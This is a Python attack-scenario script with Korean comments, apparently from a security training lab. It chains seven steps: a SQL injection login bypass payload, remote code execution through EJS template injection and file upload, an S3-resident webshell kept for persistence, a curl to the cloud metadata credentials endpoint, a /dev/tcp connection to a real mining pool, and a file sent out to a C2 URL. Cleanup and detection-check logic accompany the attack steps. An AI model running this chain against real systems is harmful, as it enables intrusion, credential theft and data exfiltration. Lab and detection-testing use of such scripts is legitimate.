"""
SQLi 인증우회 → SSTI/업로드 RCE → 웹셸 지속성 → 리소스 하이재킹.

  1. T1190      SQLi 인증 우회로 세션 탈취 (비밀번호 불필요)
  2. T1059      EJS SSTI + 업로드→실행 두 경로로 코드 실행
  3. T1505.003  S3 에 남는 업로드 파일을 재호출하는 stateless 웹셸
  4. 피벗       웹셸에서 IMDS 질의 — 임시 자격증명 획득 가능성만 로깅
  5. T1496      마이닝풀 DNS/TCP 연결 + 짧은 CPU 스핀
  6. 검증       DNS 송신 통제(Resolver DNS Firewall) 동작 확인 — 질의 1회

파괴 동작이 없어 전 단계를 플래그 없이 실행한다. S3 업로드 객체만 남고,
그 key 는 recovery/webshell_keys.json 에 기록한다.

5단계는 XMRig 같은 바이너리를 내려받지 않는다. DNS 해석 + 3초 TCP connect +
CPU 스핀(상한 5초)뿐이다. 다만 아래 둘은 의도된 결과다.
  · GuardDuty CryptoCurrency 파인딩 발생 (pool.supportxmr.com 이 목록에 있음)
  · 실존 마이닝풀로 3초간 실제 연결 시도

실행:
    python scenario2.py
    python scenario2.py --via ssti        # RCE 경로 고정 (os/ssti/upload)
    python scenario2.py --mine-seconds 0  # CPU 스핀 생략
"""

from __future__ import annotations

import argparse
import datetime as dt
import json
import sys
import uuid
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

import common
from common import WhsClient, banner

LOG = None

MINING_POOL_HOST = "pool.supportxmr.com"
MINING_POOL_PORT = 3333


# ─────────────────────────────────────────────────────────────
# 1. SQLi 인증 우회 (T1190)
# ─────────────────────────────────────────────────────────────
def step1_sqli_login(c: WhsClient) -> dict:
    banner(LOG, "STEP 1 — SQLi 인증 우회(T1190)")
    user = c.login_sqli(common.env("SQLI_PAYLOAD", "' OR '1'='1' -- "))
    LOG.info("  [+] 비밀번호 없이 세션 확보 — 첫 사용자 행으로 로그인됨")
    return user


# ─────────────────────────────────────────────────────────────
# 2. RCE — SSTI + 업로드→실행 (T1059)
# ─────────────────────────────────────────────────────────────
def step2_rce(c: WhsClient, via: str) -> None:
    banner(LOG, "STEP 2 — RCE: EJS SSTI + 업로드→실행(T1059)")

    LOG.info("  [SSTI] 실행 컨텍스트 확인 (대상 %s 고정)", c.target_host)
    for cmd in ("id", "hostname", "uname -sr"):
        out = c.on_target(cmd, via="ssti", label=f"ssti {cmd}")
        LOG.info("    ssti %-10s → %s", cmd, out.replace("\n", " | "))

    LOG.info("  [UPLOAD] 업로드→실행 경로 RCE (payloads/probe.sh)")
    key = c.upload_payload("probe.sh", TARGET=c.short_host())
    out = c.run_payload_on_target(key, label="probe.sh", expect="uid=")
    LOG.info("    probe.sh 실행 결과 → %s", out.replace("\n", " | "))


# ─────────────────────────────────────────────────────────────
# 3. 웹셸 지속성 (T1505.003)
# ─────────────────────────────────────────────────────────────
def step3_persistence(c: WhsClient) -> str:
    """
    업로드한 스크립트가 S3 에 상주하는 것 자체가 지속성이다.

    재호출은 고정된 1대에서만 일어난다. ALB 가 다른 인스턴스로 보내면
    persist.sh 의 @@TARGET@@ 가드가 빠져나가고 run_payload_on_target 이 재시도한다.
    """
    banner(LOG, "STEP 3 — 웹셸 지속성(T1505.003)")
    run_id = uuid.uuid4().hex[:12]
    marker = common.env("PERSIST_MARKER", "whs-scenario2-webshell")

    key = c.upload_payload("persist.sh", MARKER=marker, RUN_ID=run_id,
                           TARGET=c.short_host())
    LOG.info("  [+] 웹셸 S3 상주 key=%s", key)
    LOG.info("      → execute(key) 로 재호출 = stateless 웹셸 (대상 %s 한정)", c.target_host)

    out = c.run_payload_on_target(key, label="웹셸 재호출", expect="marker=")
    LOG.info("  [+] %s 에서 재호출 성공: %s", c.target_host, out.replace("\n", " | "))
    LOG.info("  [=] 대상 1대에서 웹셸 재호출 확인 — 지속성 확보")

    # 사후 정리용 기록 (S3 객체를 지워야 지속성이 제거된다)
    common.save_recovery(
        HERE, "webshell_keys.json",
        json.dumps({"run_id": run_id, "marker": marker, "s3_key": key,
                    "target_host": c.target_host,
                    "at_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
                    "cleanup": f"aws s3 rm s3://<bucket>/{key}"},
                   indent=2, ensure_ascii=False).encode())
    LOG.info("      정리용 key 기록: recovery/webshell_keys.json")
    return key


# ─────────────────────────────────────────────────────────────
# 4. (점선) IMDS 피벗 가능성 (T1552.005)
# ─────────────────────────────────────────────────────────────
def step4_imds_pivot(c: WhsClient, via: str) -> None:
    banner(LOG, "STEP 4 — (점선) 웹셸 셸 → IMDS 임시 자격증명 피벗 가능성")
    out = c.on_target(
        "curl -s --max-time 3 "
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        via=via, label="IMDS 피벗",
    ).strip()
    # 여기서 막히는 것(IMDSv2 required 등)은 정상적인 결과이므로 중단하지 않는다.
    if out and "denied" not in out.lower() and "{" not in out:
        LOG.info("  [+] 웹셸 셸에서 IMDS 도달 — role=%s", out.splitlines()[0].strip())
        LOG.info("      → security-credentials/<role> 로 ASIA 토큰 회수 시 scenario1 로 피벗 가능")
    else:
        LOG.info("  IMDS 미도달/차단 (IMDSv2 required 등): %s", out[:120] or "(빈 응답)")


# ─────────────────────────────────────────────────────────────
# 5. 리소스 하이재킹 — 마이닝 흉내 (T1496)
# ─────────────────────────────────────────────────────────────
def step5_cryptojacking(c: WhsClient, via: str, mine_seconds: int) -> None:
    banner(LOG, "STEP 5 — 리소스 하이재킹(T1496): 마이닝풀 연결 흉내")
    LOG.info("  주의: XMRig 등 바이너리는 내려받지 않음. DNS+TCP+짧은 CPU 스핀만.")

    host = common.env("MINING_POOL_HOST", MINING_POOL_HOST)
    port = common.env("MINING_POOL_PORT", str(MINING_POOL_PORT))
    wallet = common.env("MINING_WALLET", "")

    # 마이닝풀 DNS 해석 — GuardDuty CryptoCurrency 도메인 매칭 유도
    resolved = c.on_target(f"getent hosts {host} || nslookup {host}",
                           via=via, label="풀 DNS 해석").strip()
    LOG.info("  [+] 마이닝풀 DNS 해석: %s → %s", host, resolved.replace("\n", " ") or "(실패)")

    # 짧은 TCP connect — Flow Log / GuardDuty 연결 증거
    tcp = c.on_target(
        f"timeout 3 bash -c '</dev/tcp/{host}/{port} && echo TCP_OPEN' 2>&1 || echo TCP_CLOSED",
        via=via, label="풀 TCP 연결",
    ).strip()
    LOG.info("  [+] 마이닝풀 TCP connect(%s:%s): %s", host, port, tcp.replace("\n", " "))
    if wallet:
        LOG.info("  [i] (가정) 채굴 지갑=%s", common.mask(wallet, 6))

    # 아주 짧은 CPU 스핀 — 실제 채굴 아님, 부하 흔적만
    secs = max(0, min(mine_seconds, 5))
    if not secs:
        LOG.info("  [skip] CPU 스핀 생략 (--mine-seconds 0)")
        return
    LOG.info("  [+] %d초 CPU 스핀(채굴 흉내, 상한 5초)", secs)
    spin = (f"end=$(( $(date +%s) + {secs} )); c=0; "
            "while [ $(date +%s) -lt $end ]; do c=$((c+1)); done; echo spin_iters=$c")
    LOG.info("      스핀 결과: %s",
             c.on_target(spin, via=via, label="CPU 스핀").strip())


# ─────────────────────────────────────────────────────────────
# 6. DNS 송신 통제 검증 (Route 53 Resolver DNS Firewall)
# ─────────────────────────────────────────────────────────────
def step6_dns_egress_check(c: WhsClient) -> None:
    """
    대상 호스트에서 지정 도메인을 한 번 조회하고 결과를 찍는다.

    DNS Firewall 은 이름 해석 단계에서만 동작하므로, 통제가 걸렸는지는
    질의 한 번으로 판정된다. 데이터를 보내지 않고 상태도 바꾸지 않는다.

    DNS_PROBE_DOMAIN 이 비어 있으면 건너뛴다. DNS Firewall 설정 전에도
    1~5 단계는 그대로 돌아가야 하기 때문이다.
    """
    banner(LOG, "STEP 6 — DNS 송신 통제 검증(Route 53 Resolver DNS Firewall)")

    domain = common.env("DNS_PROBE_DOMAIN", "")
    if not domain:
        LOG.info("  [skip] DNS_PROBE_DOMAIN 미설정 — DNS Firewall 검증 생략")
        LOG.info("         .env 에 검증용 도메인을 넣으면 이 단계가 실행된다.")
        return

    run_id = uuid.uuid4().hex[:12]
    key = c.upload_payload("dnscheck.sh", TARGET=c.short_host(),
                           DOMAIN=domain, RUN_ID=run_id)
    out = c.run_payload_on_target(key, label="DNS 프로브", expect="DNSCHECK_BEGIN")

    resolver = verdict = ""
    for line in out.splitlines():
        if line.startswith("RESOLVER "):
            resolver = line.split(None, 1)[1].strip()
        elif line.startswith("RESOLVE "):
            verdict = line.split(None, 1)[1].strip()

    LOG.info("  [+] 질의 도메인: %s (runid=%s)", domain, run_id)
    LOG.info("      사용 리졸버: %s", resolver or "(확인 못 함)")

    if verdict.startswith("OK"):
        LOG.info("      결과: 해석 성공 — %s", verdict[3:].strip())
        LOG.info("      → 쿼리 로그의 firewall_rule_action 으로 ALERT 여부를 판정한다.")
        LOG.info("         (필드가 없으면 규칙 미적용, ALERT 면 기록만 하고 통과시킨 것)")
    else:
        LOG.info("      결과: 해석 실패 — 차단되었거나 도메인이 등록되지 않았다.")
        LOG.info("      → 쿼리 로그에 BLOCK 이 있으면 DNS Firewall 이 막은 것이다.")

    # VPC 리졸버가 아니면 DNS Firewall 평가 대상이 아니므로 결과 해석이 달라진다.
    if resolver and not resolver.endswith(".2"):
        LOG.warning("  [!] 리졸버가 VPC 리졸버(.2)가 아니다 — DNS Firewall 평가 대상이 아닐 수 있다.")

    LOG.info("      확인 쿼리 (CloudWatch Logs Insights):")
    LOG.info("        fields @timestamp, srcaddr, query_name, firewall_rule_action")
    LOG.info("        | filter query_name like /%s/", domain.split(".")[0])
    LOG.info("        | sort @timestamp desc | limit 20")


# ─────────────────────────────────────────────────────────────
# 7. 데이터 송신 확인 (T1041)
# ─────────────────────────────────────────────────────────────
def step7_data_egress(c: WhsClient) -> None:
    """
    실습 더미 파일 하나를 수신 서버로 보내고 결과를 찍는다.

    6단계가 '이름 해석이 되는가'라면 이쪽은 '데이터가 실제로 나가는가'다.
    DNS Firewall 이 BLOCK 이면 이름을 못 찾아 둘 다 실패한다 — 그게 의도된 결과다.

    C2_URL 이 비어 있으면 건너뛴다.
    """
    banner(LOG, "STEP 7 — 데이터 송신 확인(T1041)")

    url = common.env("C2_URL", "").rstrip("/")
    if not url:
        LOG.info("  [skip] C2_URL 미설정 — 데이터 송신 확인 생략")
        return

    src = common.env("C2_SRC_FILE", "/opt/whs-lab-data/orders.csv")
    run_id = uuid.uuid4().hex[:12]

    key = c.upload_payload("upload.sh", TARGET=c.short_host(),
                           C2_URL=url, SRC_FILE=src, RUN_ID=run_id)
    out = c.run_payload_on_target(key, label="데이터 송신", expect="UPLOAD_BEGIN")

    if "REFUSED:" in out:
        raise SystemExit(f"[!] 중단: 허용되지 않은 송신 경로 — {src}")
    if "NO_SRC:" in out:
        LOG.warning("  [!] %s 에 대상 파일이 없다 — 인프라에서 더미를 심어야 한다.", src)
        return

    size = http = resp = ""
    for line in out.splitlines():
        if line.startswith("SRC_SIZE "):
            size = line.split(None, 1)[1].strip()
        elif line.startswith("RESP HTTP "):
            http = line.split()[-1]
        elif line.startswith("RESP ") and "HTTP" not in line:
            resp = line[5:].strip() or resp

    LOG.info("  [+] 대상 파일: %s (%s bytes)", src, size or "?")
    if http == "200":
        LOG.info("  [+] 전송 성공 — HTTP 200, 응답: %s", resp or "(없음)")
        LOG.info("      → 랩 VPC 밖으로 데이터가 실제로 나갔다.")
        LOG.info("      수신 측 로그에 출발지가 NAT Gateway 주소로 남는다.")
    elif http in ("", "000"):
        LOG.info("  [=] 전송 실패 — 이름 해석 또는 연결 불가")
        LOG.info("      → DNS Firewall 이 BLOCK 이면 정상적인 결과다.")
        LOG.info("      응답: %s", resp or "(없음)")
    else:
        LOG.info("  [=] 전송 거부 — HTTP %s, 응답: %s", http, resp or "(없음)")

    common.save_recovery(
        HERE, "c2_egress.json",
        json.dumps({"run_id": run_id, "url": url, "src": src,
                    "size": size, "http": http,
                    "target_host": c.target_host,
                    "at_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
                    "cleanup": "수신 서버의 저장 디렉터리를 비울 것"},
                   indent=2, ensure_ascii=False).encode())


# ─────────────────────────────────────────────────────────────
# main
# ─────────────────────────────────────────────────────────────
def restore(bucket: str) -> None:
    """S3 에 남긴 업로드 객체를 지운다. 이게 웹셸의 실체라 지워야 지속성이 사라진다."""
    banner(LOG, "RESTORE — S3 업로드 객체 삭제")
    common.delete_uploaded_objects(LOG, HERE, bucket)


def main():
    global LOG
    ap = argparse.ArgumentParser(
        description="scenario2 — SQLi→SSTI/업로드 RCE→웹셸 지속성→리소스 하이재킹")
    ap.add_argument("--via", choices=["os", "ssti", "upload"], default="ssti",
                    help="RCE 실행 경로 (기본 ssti)")
    ap.add_argument("--mine-seconds", type=int, default=3,
                    help="5 CPU 스핀 시간(초, 상한 5). 0이면 스핀 생략")
    ap.add_argument("--restore", action="store_true",
                    help="S3 에 남은 업로드 객체(웹셸)를 삭제하고 종료")
    args = ap.parse_args()

    common.load_env(HERE)
    LOG = common.get_logger(HERE, "scenario2")
    banner(LOG, "SCENARIO 2 — SQLi → RCE → 웹셸 지속성 → 리소스 하이재킹",
           "흐름도2 (WHS 실습)")

    if args.restore:
        restore(common.need_env("UPLOAD_BUCKET"))
        banner(LOG, "SCENARIO 2 복구 종료", "로그: scenario2/scenario2.log")
        return

    # 지우지 않은 업로드 객체가 있으면 막는다. 그대로 또 돌리면 S3 에 웹셸이
    # 겹겹이 쌓이고 어느 것이 어느 실행 것인지 구분이 안 된다.
    common.require_restored(
        LOG, HERE, "python scenario2.py --restore",
        [("uploaded_objects.json", "keys", "S3 에 업로드 객체(웹셸)가 남아 있다")])

    # recovery_dir 을 주면 업로드한 S3 key 가 recovery/uploaded_objects.json 에 쌓인다.
    # --via upload 는 명령마다 임시 스크립트를 올리므로 이 기록이 없으면 정리를 못 한다.
    c = WhsClient(common.env("WEBAPP_URL", "https://whs4namu.click"), LOG,
                  recovery_dir=HERE)

    step1_sqli_login(c)

    # 인스턴스 1대를 고정한다. 이후 모든 단계가 그 한 대에서만 실행되고,
    # ALB 가 다른 곳으로 보내면 가드가 막고 재시도한다.
    c.pin_target(via=args.via)

    step2_rce(c, args.via)
    step3_persistence(c)
    step4_imds_pivot(c, args.via)
    step5_cryptojacking(c, args.via, args.mine_seconds)
    step6_dns_egress_check(c)
    step7_data_egress(c)

    banner(LOG, "SCENARIO 2 종료", "로그: scenario2/scenario2.log")

    LOG.warning("")
    LOG.warning("[원상복구]  python scenario2.py --restore")
    LOG.warning("  S3 에 올린 업로드 객체를 지운다. 지우기 전까지는 key 만 알면")
    LOG.warning("  계속 재실행되는 웹셸로 남는다 (호스트에는 아무것도 안 남는다).")


if __name__ == "__main__":
    main()
